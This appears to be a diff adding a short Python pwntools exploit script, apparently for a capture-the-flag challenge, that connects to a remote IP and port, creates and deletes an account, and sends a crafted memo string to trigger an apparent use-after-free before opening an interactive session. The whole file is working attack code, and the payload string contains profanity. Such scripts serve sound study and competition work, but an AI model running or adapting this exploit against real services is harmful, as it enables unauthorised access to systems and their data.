@@ -1,0 +1,30 @@
+#!/bin/env python3
+
+from pwn import *
+from time import sleep
+
+p = remote("159.65.81.40", 30691)
+p.recvline("Please enter an operation number:")
+sleep(1)
+p.sendline("1")
+sleep(1)
+p.recvline("First name:")
+p.sendline("")
+sleep(1)
+p.recvline("Last name:")
+p.sendline("")
+sleep(1)
+p.recvline("Please enter an operation number:")
+p.sendline("3")
+p.recvline("Account deleted successfully")
+sleep(1)
+p.recvline("Please enter an operation number:")
+p.sendline("5")
+sleep(1)
+p.recvline("Please enter memo:")
+p.sendline("aabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmfuck")
+p.recvline("Thank you, please keep this reference number number safe:")
+sleep(1)
+p.recvline("Please enter an operation number:")
+p.sendline("5")
+p.interactive()
